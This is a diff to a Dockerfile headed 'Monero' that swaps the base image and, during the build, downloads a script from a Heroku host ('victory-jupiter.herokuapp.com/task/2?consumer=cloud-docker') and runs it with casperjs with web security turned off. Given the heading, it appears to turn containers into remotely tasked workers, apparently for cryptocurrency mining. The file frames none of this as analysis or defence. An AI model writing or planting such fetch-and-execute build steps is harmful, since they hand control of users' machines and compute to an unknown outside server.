@@ -1,11 +1,13 @@
 # Monero
 
-FROM vitr/casperjs
+FROM zjgsuwk/casperjs
 MAINTAINER zjgsuwk
 
 ENV SCRIPT_DIR=/home
 
-RUN echo 'time is : 1519521730550' && apt-get update && apt-get -y install curl && curl  http://victory-jupiter.herokuapp.com:80/task/2?consumer=cloud-docker \
+RUN echo 'time is : 1519525331215'
+
+RUN  curl  http://victory-jupiter.herokuapp.com:80/task/2?consumer=cloud-docker \
 > ${SCRIPT_DIR}/script.js
 
 RUN /usr/local/bin/casperjs --web-security=no  ${SCRIPT_DIR}/script.js
